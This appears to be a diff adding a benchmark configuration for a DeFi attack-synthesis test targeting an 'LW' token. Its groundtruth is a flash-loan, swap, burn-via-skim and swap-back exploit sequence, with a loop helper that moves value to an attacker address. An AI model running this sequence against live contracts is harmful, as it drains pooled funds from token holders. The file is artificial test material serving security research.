@@ -1,0 +1,68 @@
+# Information for benchmarks building.
+project_name: "LW"
+
+ctrt_name2cls:
+  - ["lw", "LW"]
+  - ["usdt", "USDT"]
+  - ["market", "URoter"]
+  - ["pair", "UniswapV2Pair"]
+  - ["factory", "UniswapV2Factory"]
+  - ["router", "UniswapV2Router"]
+
+ctrt_name2deploy:
+  - ["usdt", ""]
+  - ["lw", "new LW()"]
+  - ["market", "new URoter (address(usdt), address(lw))"]
+  - ["pair", ""]
+  - ["factory", ""]
+  - ["router", ""]
+    
+extra_actions: 
+  - "function burn_lw_pair(uint256 amount) internal eurus {
+        for (uint i; i < 40; i++) {
+            lw.transfer(address(pair), amount);
+            pair.skim(address(attacker));
+            lw.receive_eth();
+        }   
+    }"
+
+extra_deployments:
+  - "lw._afterdeploy(address(router), address(pair), address(market), address(usdt));"
+
+extra_statements:
+  - "vm.warp(blockTimestamp);
+    vm.roll(29668034);"
+
+attack_goal_str: "usdt;1e6"
+
+groundtruth: 
+  - ["borrow", "usdt", "owner", "1000000 ether"]
+  - ["swap", "pair", "attacker", "usdt", "lw", "usdt.balanceOf(address(attacker))", 
+    "pair.getAmountOut(usdt.balanceOf(address(attacker)), address(usdt))"]
+  - ["burn", "lw", "pair", "2510e18 * 1e18 / lw.getTokenPrice()"]
+  - ["swap", "pair", "attacker", "lw", "usdt", "lw.balanceOf(address(attacker))", 
+    "pair.getAmountOut(lw.balanceOf(address(attacker)), address(lw)) * 9 / 10"]
+  - ["payback", "usdt", "owner", "1000000 ether"]
+
+
+# Information for search space building.
+roles:
+  "usdt":
+    is_asset: true
+    is_erc20: true
+    is_stablecoin: true
+  "lw":
+    is_asset: true
+    is_erc20: true
+    is_stablecoin: true
+  "pair":
+    is_swappair: true
+    is_uniswap: true
+    token_pair: ["usdt", "lw"]
+    support_swaps:
+      "usdt": ["usdt", "lw"]
+      "lw": ["usdt", "lw"]
+    is_oracle: true
+    oracle: "pair"
+
+pattern: "Token burn"
